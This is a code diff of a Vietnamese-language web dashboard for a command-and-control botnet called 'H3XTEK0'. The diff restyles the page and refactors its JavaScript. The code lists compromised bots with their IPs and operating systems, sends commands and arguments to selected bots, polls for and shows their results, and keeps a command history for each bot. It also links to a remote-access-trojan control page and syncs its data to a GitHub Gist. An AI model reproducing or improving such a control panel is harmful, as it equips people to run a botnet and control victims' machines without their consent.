@@ -2,116 +2,342 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Botnet Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>C2 Botnet - H3XTEK0</title>
     <link rel="stylesheet" href="/style.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; color: #00ff88; font-family: 'Segoe UI', sans-serif; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .header h1 { color: #00ff88; text-shadow: 0 0 20px #00ff8855; }
-        .password-badge { background: #ff0044; padding: 5px 15px; border-radius: 20px; font-size: 12px; color: white; }
-        .gist-status { font-size: 12px; color: #888; margin-bottom: 10px; }
+        /* ===== DASHBOARD SPECIFIC ===== */
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff0033, #ff6688);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: none;
+        }
+        .header h1 .sub {
+            font-size: 12px;
+            font-weight: 400;
+            -webkit-text-fill-color: rgba(255,255,255,0.4);
+            display: block;
+        }
+        .password-badge {
+            background: rgba(255, 0, 51, 0.2);
+            border: 1px solid rgba(255, 0, 51, 0.3);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            font-family: monospace;
+            letter-spacing: 1px;
+            box-shadow: 0 0 20px rgba(255, 0, 51, 0.1);
+        }
+
+        .gist-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            padding: 10px 16px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            background: rgba(255, 0, 51, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 0, 51, 0.1);
+        }
         .gist-status .connected { color: #00ff88; }
         .gist-status .disconnected { color: #ff4444; }
-        .gist-status button { background: none; border: 1px solid #00ff8855; color: #00ff88; padding: 2px 10px; border-radius: 3px; cursor: pointer; font-size: 11px; }
-        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
-        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 10px; border: 1px solid #00ff8855; text-align: center; }
-        .stat-number { font-size: 32px; font-weight: bold; color: #00ff88; }
-        .stat-label { color: #888; font-size: 14px; }
-        .cmd-box { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; align-items: center; }
-        .cmd-box input { padding: 10px; background: #1a1a2e; border: 1px solid #00ff8855; color: white; border-radius: 5px; flex: 1; min-width: 120px; }
-        .cmd-box input:focus { outline: none; border-color: #00ff88; }
-        .cmd-box button { padding: 10px 30px; background: #00ff88; color: #0a0a0f; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .cmd-box button:hover { background: #00cc77; }
-        .cmd-box .result-box { background: #0a0a0f; padding: 8px 15px; border-radius: 5px; border: 1px solid #00ff8855; color: #00ff88; font-family: monospace; font-size: 13px; min-width: 200px; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1a1a2e; border-radius: 10px; overflow: hidden; }
-        th { background: #00ff8822; color: #00ff88; padding: 12px; text-align: left; }
-        td { padding: 10px 12px; border-bottom: 1px solid #00ff8811; }
+        .gist-status button {
+            background: rgba(255, 0, 51, 0.15);
+            border: 1px solid rgba(255, 0, 51, 0.2);
+            color: var(--text-secondary);
+            padding: 4px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.3s;
+        }
+        .gist-status button:hover {
+            background: rgba(255, 0, 51, 0.25);
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .stat-card {
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: default;
+        }
+        .stat-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 0 40px var(--primary-glow);
+        }
+        .stat-number {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ff0033, #ff6688);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .stat-label {
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .action-bar {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .cmd-box {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            align-items: center;
+        }
+        .cmd-box input {
+            flex: 1;
+            min-width: 120px;
+        }
+        .cmd-box input:first-child { flex: 0.5; min-width: 100px; }
+        .cmd-box input:nth-child(2) { flex: 2; }
+        .cmd-box .result-box {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 0, 51, 0.15);
+            font-family: monospace;
+            font-size: 13px;
+            min-width: 180px;
+            max-width: 400px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            color: var(--text-secondary);
+        }
+        .cmd-box .result-box .ok { color: #00ff88; }
+        .cmd-box .result-box .pending { color: #ffaa00; }
+        .cmd-box .result-box .error { color: #ff0044; }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            overflow: hidden;
+            font-size: 13px;
+        }
+        table thead {
+            background: rgba(255, 0, 51, 0.08);
+        }
+        table th {
+            padding: 12px 14px;
+            text-align: left;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid rgba(255, 0, 51, 0.15);
+        }
+        table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            vertical-align: middle;
+        }
+        table tr:hover td {
+            background: rgba(255, 0, 51, 0.04);
+        }
         .online { color: #00ff88; }
         .offline { color: #ff4444; }
-        .btn { background: #00ff88; color: #0a0a0f; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; }
-        .btn:hover { background: #00cc77; }
-        .btn-danger { background: #ff0044; color: white; }
-        .btn-danger:hover { background: #cc0033; }
-        .btn-rat { background: #ff0044; color: white; padding: 8px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
-        .btn-rat:hover { background: #cc0033; }
-        .btn-small { padding: 3px 10px; font-size: 12px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
-        .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 700px; max-height: 80vh; overflow-y: auto; }
-        .modal-content pre { background: #0a0a0f; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; color: #00ff88; max-height: 400px; overflow-y: auto; }
-        .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
-        .pending-badge { background: #ffaa00; color: #0a0a0f; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
-        .ok-badge { background: #00ff88; color: #0a0a0f; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
-        .error-badge { background: #ff0044; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
+        .btn-small {
+            padding: 4px 10px;
+            font-size: 11px;
+            border-radius: 6px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            max-width: 700px;
+            width: 100%;
+            max-height: 80vh;
+            padding: 28px;
+            overflow-y: auto;
+            position: relative;
+        }
+        .modal-content .close {
+            position: absolute;
+            top: 12px;
+            right: 18px;
+            font-size: 28px;
+            cursor: pointer;
+            color: var(--text-muted);
+            transition: color 0.3s;
+            line-height: 1;
+        }
+        .modal-content .close:hover {
+            color: var(--primary);
+        }
+        .modal-content h3 {
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+        .modal-content pre {
+            background: rgba(0,0,0,0.6);
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 12px;
+            line-height: 1.6;
+            overflow-x: auto;
+            color: #ccdddd;
+            max-height: 50vh;
+            overflow-y: auto;
+            border: 1px solid rgba(255, 0, 51, 0.1);
+            font-family: 'Courier New', monospace;
+        }
+        .modal-content .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .badge-pending { background: rgba(255, 170, 0, 0.2); color: #ffaa00; }
+        .badge-ok { background: rgba(0, 255, 136, 0.15); color: #00ff88; }
+        .badge-error { background: rgba(255, 0, 68, 0.2); color: #ff0044; }
+
+        /* Mobile responsive overrides */
+        @media (max-width: 768px) {
+            .header h1 { font-size: 18px; }
+            .cmd-box input:first-child { flex: 1; }
+            .cmd-box .result-box { min-width: 100px; max-width: 200px; font-size: 11px; }
+            .stats { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+            .stat-card { padding: 14px; }
+            .stat-number { font-size: 22px; }
+        }
+        @media (max-width: 480px) {
+            .header { padding: 12px; }
+            .cmd-box { padding: 12px; }
+            table { font-size: 10px; }
+            table th, table td { padding: 6px 8px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔐 C2 Botnet Control</h1>
+        <!-- HEADER -->
+        <div class="header glass glow-red">
+            <h1>
+                ⚡ H3XTEK0
+                <span class="sub">C2 Botnet Control</span>
+            </h1>
             <div class="password-badge">🔑 H3XTEK0</div>
         </div>
 
+        <!-- GIST STATUS -->
         <div class="gist-status">
             📦 GitHub Gist: <span id="gistStatusText" class="disconnected">Đang kiểm tra...</span>
             <button onclick="checkGistStatus()">Kiểm tra</button>
             <button onclick="syncToGist()">🔄 Sync</button>
         </div>
 
+        <!-- STATS -->
         <div class="stats">
-            <div class="stat-card"><div class="stat-number" id="totalBots">0</div><div class="stat-label">Tổng Bot</div></div>
-            <div class="stat-card"><div class="stat-number" id="onlineBots">0</div><div class="stat-label">Online</div></div>
-            <div class="stat-card"><div class="stat-number" id="offlineBots">0</div><div class="stat-label">Offline</div></div>
-            <div class="stat-card"><div class="stat-number" id="groupsCount">0</div><div class="stat-label">Groups</div></div>
+            <div class="stat-card glass"><div class="stat-number" id="totalBots">0</div><div class="stat-label">Tổng Bot</div></div>
+            <div class="stat-card glass"><div class="stat-number" id="onlineBots">0</div><div class="stat-label">Online</div></div>
+            <div class="stat-card glass"><div class="stat-number" id="offlineBots">0</div><div class="stat-label">Offline</div></div>
+            <div class="stat-card glass"><div class="stat-number" id="groupsCount">0</div><div class="stat-label">Groups</div></div>
         </div>
 
-        <div style="margin: 20px 0; display: flex; gap: 10px; flex-wrap: wrap;">
-            <a href="/rat" class="btn-rat">🎯 Mở RAT Control</a>
-            <button onclick="viewDB()" class="btn">📊 Xem Database</button>
-            <button onclick="clearAllData()" class="btn-danger">🗑️ Xóa toàn bộ DB</button>
+        <!-- ACTION BAR -->
+        <div class="action-bar">
+            <a href="/rat" class="btn-rat">🎯 RAT Control</a>
+            <button onclick="viewDB()" class="btn btn-outline">📊 Database</button>
+            <button onclick="clearAllData()" class="btn btn-danger">🗑️ Xóa DB</button>
         </div>
 
-        <div class="cmd-box">
-            <input type="text" id="botIdInput" placeholder="Bot ID">
-            <input type="text" id="cmdInput" placeholder="Lệnh (ps, sc, ping...)" style="flex:2;">
-            <input type="text" id="argsInput" placeholder='Args ["arg1"]'>
-            <button onclick="sendCommand()">🚀 Gửi</button>
-            <div class="result-box" id="cmdResultDisplay">Chưa có kết quả</div>
+        <!-- COMMAND BOX -->
+        <div class="cmd-box glass">
+            <input type="text" id="botIdInput" class="input-glass" placeholder="Bot ID">
+            <input type="text" id="cmdInput" class="input-glass" placeholder="Lệnh (ps, sc, ping...)" style="flex:2;">
+            <input type="text" id="argsInput" class="input-glass" placeholder='Args ["arg1"]'>
+            <button onclick="sendCommand()" class="btn btn-primary">🚀 Gửi</button>
+            <div class="result-box" id="cmdResultDisplay">⏳ Chưa có kết quả</div>
         </div>
 
-        <table>
-            <thead>
-                <tr>
-                    <th>Bot ID</th>
-                    <th>Group</th>
-                    <th>Version</th>
-                    <th>OS</th>
-                    <th>IP</th>
-                    <th>Last Seen</th>
-                    <th>Status</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody id="botsTable"></tbody>
-        </table>
+        <!-- BOTS TABLE -->
+        <div class="glass" style="overflow-x:auto; padding: 4px 0;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Bot ID</th>
+                        <th>Group</th>
+                        <th>Version</th>
+                        <th>OS</th>
+                        <th>IP</th>
+                        <th>Last Seen</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="botsTable"></tbody>
+            </table>
+        </div>
     </div>
 
-    <!-- Modal xem Database -->
+    <!-- MODAL: DATABASE -->
     <div id="dbModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="document.getElementById('dbModal').style.display='none'">&times;</span>
+        <div class="modal-content glass glow-red">
+            <span class="close" onclick="closeModal('dbModal')">&times;</span>
             <h3>📊 Toàn bộ Database</h3>
             <pre id="dbContent">Đang tải...</pre>
         </div>
     </div>
 
-    <!-- Modal xem kết quả chi tiết -->
+    <!-- MODAL: RESULT -->
     <div id="resultModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="document.getElementById('resultModal').style.display='none'">&times;</span>
-            <h3>Kết quả lệnh</h3>
+        <div class="modal-content glass glow-red">
+            <span class="close" onclick="closeModal('resultModal')">&times;</span>
+            <h3>📋 Kết quả lệnh</h3>
             <pre id="resultContent">Đang tải...</pre>
         </div>
     </div>
@@ -125,6 +351,18 @@
             return { 'Authorization': `Bearer ${API_PASSWORD}` };
         }
 
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+            document.getElementById(id).style.display = 'none';
+        }
+
+        function openModal(id) {
+            const el = document.getElementById(id);
+            el.style.display = 'flex';
+            setTimeout(() => el.classList.add('active'), 10);
+        }
+
+        // --- FETCH BOTS ---
         async function fetchBots() {
             try {
                 const res = await fetch('/api/bots', { headers: getAuth() });
@@ -140,22 +378,26 @@
         function renderBots(data) {
             const tbody = document.getElementById('botsTable');
             tbody.innerHTML = '';
+            if (!data || data.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" style="text-align:center;padding:30px;color:#444;">🔴 Chưa có bot nào kết nối</td></tr>`;
+                return;
+            }
             data.forEach(b => {
                 const tr = document.createElement('tr');
                 const statusClass = b.online ? 'online' : 'offline';
                 const statusText = b.online ? '🟢 Online' : '🔴 Offline';
                 tr.innerHTML = `
                     <td><strong>${b.bot_id.slice(0, 8)}...</strong></td>
-                    <td>${b.group_name}</td>
-                    <td>v${b.version}</td>
-                    <td>${b.os}</td>
-                    <td>${b.ip}</td>
-                    <td>${new Date(b.last_seen).toLocaleString()}</td>
+                    <td>${b.group_name || 'default'}</td>
+                    <td>v${b.version || '1.0'}</td>
+                    <td>${b.os || 'Unknown'}</td>
+                    <td>${b.ip || 'N/A'}</td>
+                    <td>${b.last_seen ? new Date(b.last_seen).toLocaleString() : 'N/A'}</td>
                     <td class="${statusClass}">${statusText}</td>
-                    <td>
-                        <button class="btn btn-small" onclick="selectBot('${b.bot_id}')">Chọn</button>
-                        <button class="btn btn-small" onclick="viewHistory('${b.bot_id}')">📜</button>
-                        <button class="btn-danger btn-small" onclick="deleteBot('${b.bot_id}')">🗑️</button>
+                    <td style="display:flex;gap:4px;flex-wrap:wrap;">
+                        <button class="btn btn-primary btn-small" onclick="selectBot('${b.bot_id}')">Chọn</button>
+                        <button class="btn btn-outline btn-small" onclick="viewHistory('${b.bot_id}')">📜</button>
+                        <button class="btn btn-danger btn-small" onclick="deleteBot('${b.bot_id}')">🗑️</button>
                     </td>
                 `;
                 tbody.appendChild(tr);
@@ -170,62 +412,38 @@
             document.getElementById('totalBots').textContent = total;
             document.getElementById('onlineBots').textContent = online;
             document.getElementById('offlineBots').textContent = offline;
-            document.getElementById('groupsCount').textContent = groups;
+            document.getElementById('groupsCount').textContent = groups || 0;
         }
 
         function selectBot(botId) {
             document.getElementById('botIdInput').value = botId;
         }
 
+        // --- DELETE BOT ---
         async function deleteBot(botId) {
             if (!confirm(`Xóa bot ${botId.slice(0,8)}...?`)) return;
             try {
-                const res = await fetch(`/api/bots/${botId}`, {
-                    method: 'DELETE',
-                    headers: getAuth()
-                });
+                const res = await fetch(`/api/bots/${botId}`, { method: 'DELETE', headers: getAuth() });
                 if (res.ok) {
                     alert('✅ Đã xóa bot');
                     fetchBots();
                 }
-            } catch (e) {
-                alert('❌ Lỗi: ' + e.message);
-            }
+            } catch (e) { alert('❌ Lỗi: ' + e.message); }
         }
 
+        // --- SEND COMMAND ---
         async function sendCommand() {
             const botId = document.getElementById('botIdInput').value.trim();
             const command = document.getElementById('cmdInput').value.trim();
             const argsRaw = document.getElementById('argsInput').value.trim();
             let args = [];
-            try {
-                if (argsRaw) args = JSON.parse(argsRaw);
-            } catch (e) {
-                alert('Args phải là JSON array hợp lệ!');
-                return;
-            }
+            try { if (argsRaw) args = JSON.parse(argsRaw); } catch (e) { alert('Args phải là JSON array hợp lệ!'); return; }
+            if (!command) { alert('Nhập lệnh đi!'); return; }
+            if (!botId) { alert('Nhập Bot ID!'); return; }
 
-            if (!command) {
-                alert('Nhập lệnh đi!');
-                return;
-            }
-
-            if (!botId) {
-                alert('Nhập Bot ID!');
-                return;
-            }
-
-            // Tìm bot trong danh sách
             const bot = botsData.find(b => b.bot_id === botId);
-            if (!bot) {
-                alert('Bot ID không tồn tại!');
-                return;
-            }
-
-            if (!bot.online) {
-                alert('Bot đang offline!');
-                return;
-            }
+            if (!bot) { alert('Bot ID không tồn tại!'); return; }
+            if (!bot.online) { alert('Bot đang offline!'); return; }
 
             document.getElementById('cmdResultDisplay').textContent = '⏳ Đang gửi...';
 
@@ -235,97 +453,89 @@
                 body: JSON.stringify({ bot_id: botId, command, args })
             });
             const data = await res.json();
-            
+
             if (data.status === 'sent') {
                 lastCmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi kết quả... (${data.cmd_id})`;
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi... (${data.cmd_id.slice(-6)})`;
                 
-                // POLLING KẾT QUẢ
                 let attempts = 0;
-                const maxAttempts = 15; // 15 * 1s = 15s
+                const maxAttempts = 15;
                 const interval = setInterval(async () => {
                     attempts++;
                     try {
                         const res2 = await fetch(`/api/results/${lastCmdId}`, { headers: getAuth() });
                         const result = await res2.json();
-                        
                         if (result.status === 'ok' || result.status === 'error') {
                             clearInterval(interval);
+                            const el = document.getElementById('cmdResultDisplay');
                             if (result.result) {
-                                document.getElementById('cmdResultDisplay').textContent = `✅ ${result.result.substring(0, 60)}${result.result.length > 60 ? '...' : ''}`;
+                                el.innerHTML = `<span class="ok">✅ ${result.result.substring(0, 60)}${result.result.length > 60 ? '...' : ''}</span>`;
                                 document.getElementById('resultContent').textContent = result.result;
-                                document.getElementById('resultModal').style.display = 'block';
+                                openModal('resultModal');
                             } else {
-                                document.getElementById('cmdResultDisplay').textContent = `⚠️ Không có kết quả`;
+                                el.innerHTML = `<span class="error">⚠️ Không có kết quả</span>`;
                             }
                             fetchBots();
                         } else if (attempts >= maxAttempts) {
                             clearInterval(interval);
-                            document.getElementById('cmdResultDisplay').textContent = `⏰ Hết thời gian chờ kết quả`;
+                            document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Hết thời gian chờ</span>`;
                         }
                     } catch(e) {
                         if (attempts >= maxAttempts) {
                             clearInterval(interval);
-                            document.getElementById('cmdResultDisplay').textContent = `❌ Lỗi lấy kết quả`;
+                            document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy kết quả</span>`;
                         }
                     }
                 }, 1000);
             } else {
-                document.getElementById('cmdResultDisplay').textContent = `⚠️ ${data.status}: ${data.cmd_id}`;
+                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}: ${data.cmd_id}</span>`;
             }
         }
 
+        // --- VIEW HISTORY ---
         async function viewHistory(botId) {
             try {
                 const res = await fetch(`/api/history/${botId}`, { headers: getAuth() });
                 const data = await res.json();
-                let text = `Lịch sử lệnh của ${botId}\n${'='.repeat(50)}\n\n`;
-                if (data.length === 0) {
-                    text += 'Không có lịch sử';
+                let text = `📜 Lịch sử lệnh của ${botId}\n${'═'.repeat(50)}\n\n`;
+                if (!data || data.length === 0) {
+                    text += '🔴 Không có lịch sử';
+                } else {
+                    data.forEach(cmd => {
+                        const badge = cmd.status === 'ok' ? '✅' : cmd.status === 'error' ? '❌' : '⏳';
+                        text += `${badge} [${new Date(cmd.issued_at).toLocaleString()}] ${cmd.command}\n`;
+                        text += `   ID: ${cmd.cmd_id}\n`;
+                        text += `   Status: ${cmd.status || 'pending'}\n`;
+                        if (cmd.result) text += `   Result: ${cmd.result}\n`;
+                        text += `   ${'─'.repeat(30)}\n`;
+                    });
                 }
-                data.forEach(cmd => {
-                    const statusBadge = cmd.status === 'ok' ? '✅' : cmd.status === 'error' ? '❌' : '⏳';
-                    text += `${statusBadge} [${new Date(cmd.issued_at).toLocaleString()}] ${cmd.command}\n`;
-                    text += `   ID: ${cmd.cmd_id}\n`;
-                    text += `   Status: ${cmd.status || 'pending'}\n`;
-                    if (cmd.result) text += `   Result: ${cmd.result}\n`;
-                    text += `   ${'-'.repeat(30)}\n`;
-                });
                 document.getElementById('resultContent').textContent = text;
-                document.getElementById('resultModal').style.display = 'block';
-            } catch (e) {
-                alert('Lỗi lấy lịch sử: ' + e.message);
-            }
+                openModal('resultModal');
+            } catch (e) { alert('Lỗi: ' + e.message); }
         }
 
+        // --- VIEW DB ---
         async function viewDB() {
             try {
                 const res = await fetch('/api/db', { headers: getAuth() });
                 const data = await res.json();
                 document.getElementById('dbContent').textContent = JSON.stringify(data, null, 2);
-                document.getElementById('dbModal').style.display = 'block';
-            } catch (e) {
-                alert('Lỗi: ' + e.message);
-            }
+                openModal('dbModal');
+            } catch (e) { alert('Lỗi: ' + e.message); }
         }
 
+        // --- CLEAR ALL ---
         async function clearAllData() {
-            if (!confirm('⚠️ Xóa TOÀN BỘ database? Hành động này không thể hoàn tác!')) return;
-            if (!confirm('Xác nhận lần cuối: Xóa hết bot, lệnh, log?')) return;
+            if (!confirm('⚠️ Xóa TOÀN BỘ database? Không thể hoàn tác!')) return;
+            if (!confirm('Xác nhận lần cuối?')) return;
             try {
-                const res = await fetch('/api/db', {
-                    method: 'DELETE',
-                    headers: getAuth()
-                });
-                if (res.ok) {
-                    alert('✅ Đã xóa toàn bộ database');
-                    fetchBots();
-                }
-            } catch (e) {
-                alert('❌ Lỗi: ' + e.message);
-            }
+                const res = await fetch('/api/db', { method: 'DELETE', headers: getAuth() });
+                if (res.ok) { alert('✅ Đã xóa toàn bộ'); fetchBots(); }
+            } catch (e) { alert('❌ Lỗi: ' + e.message); }
         }
 
+        // --- GIST ---
         async function checkGistStatus() {
             try {
                 const res = await fetch('/api/gist/status', { headers: getAuth() });
@@ -335,31 +545,34 @@
                     el.textContent = `✅ Connected (ID: ${data.gist_id})`;
                     el.className = 'connected';
                 } else {
-                    el.textContent = '❌ Not configured (set GITHUB_TOKEN & GIST_ID)';
+                    el.textContent = '❌ Chưa cấu hình Gist';
                     el.className = 'disconnected';
                 }
-            } catch (e) {
-                document.getElementById('gistStatusText').textContent = '❌ Error checking';
-            }
+            } catch (e) { document.getElementById('gistStatusText').textContent = '❌ Lỗi kiểm tra'; }
         }
 
         async function syncToGist() {
             try {
-                const res = await fetch('/api/gist/sync', {
-                    method: 'POST',
-                    headers: getAuth()
-                });
+                const res = await fetch('/api/gist/sync', { method: 'POST', headers: getAuth() });
                 const data = await res.json();
-                alert(data.status === 'ok' ? '✅ Synced successfully!' : '❌ Sync failed: ' + data.message);
-            } catch (e) {
-                alert('❌ Error: ' + e.message);
-            }
+                alert(data.status === 'ok' ? '✅ Sync thành công!' : '❌ Sync thất bại: ' + data.message);
+            } catch (e) { alert('❌ Lỗi: ' + e.message); }
         }
 
-        // Auto refresh
+        // --- AUTO REFRESH ---
         setInterval(fetchBots, 5000);
         fetchBots();
         checkGistStatus();
+
+        // Click outside modal to close
+        document.querySelectorAll('.modal').forEach(m => {
+            m.addEventListener('click', (e) => {
+                if (e.target === m) {
+                    m.classList.remove('active');
+                    m.style.display = 'none';
+                }
+            });
+        });
     </script>
 </body>
 </html>
